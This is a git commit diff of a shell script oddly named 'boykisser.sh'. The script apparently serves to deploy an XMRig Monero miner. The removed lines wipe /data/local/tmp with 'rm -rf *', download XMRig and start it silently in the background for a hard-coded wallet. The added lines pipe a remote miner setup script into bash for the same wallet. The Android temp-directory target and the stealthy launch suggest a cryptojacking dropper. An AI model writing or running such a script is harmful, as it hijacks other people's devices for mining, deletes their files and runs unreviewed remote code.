bc2d6006fa5f04d5f38049f2024bd97a8dd09765
ripevo1 <evorip@drugsellers.com>
2024-11-03 13:24:27 +0100

    Update boykisser.sh

--- boykisser.sh
+++ boykisser.sh
@@ -1,5 +1,4 @@
-cd /data/local/tmp
-rm -rf *
-curl -L -o /data/local/tmp/xmrig.tar.gz https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz
-tar -xvzf xmrig.tar.gz
-nohup ./xmrig -o gulf.moneroocean.stream:10128 -u 4576JTdTYFp6hi2n2Ci54eSFzV8GSkNJTJVC1zswJpk7byZMSfu4W4mVpCsoQJHfSyQS6y5CkZ1kbZTTbUBbpFrYRgtzsrG.worker456834 -k --tls
+cd ~ & mkdir boykisser & cd boykisser
+pkg install git cmake make screen clang
+screen -S miner
+curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 4576JTdTYFp6hi2n2Ci54eSFzV8GSkNJTJVC1zswJpk7byZMSfu4W4mVpCsoQJHfSyQS6y5CkZ1kbZTTbUBbpFrYRgtzsrG
